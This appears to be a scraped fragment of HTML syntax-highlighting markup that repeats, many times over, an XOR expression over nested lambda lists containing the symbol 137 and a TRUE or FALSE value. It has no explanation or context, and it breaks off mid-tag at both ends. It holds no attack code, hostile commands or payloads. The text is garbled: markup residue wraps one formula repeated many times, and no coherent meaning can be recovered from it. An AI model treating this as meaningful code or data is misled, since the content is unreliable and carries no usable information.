class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span 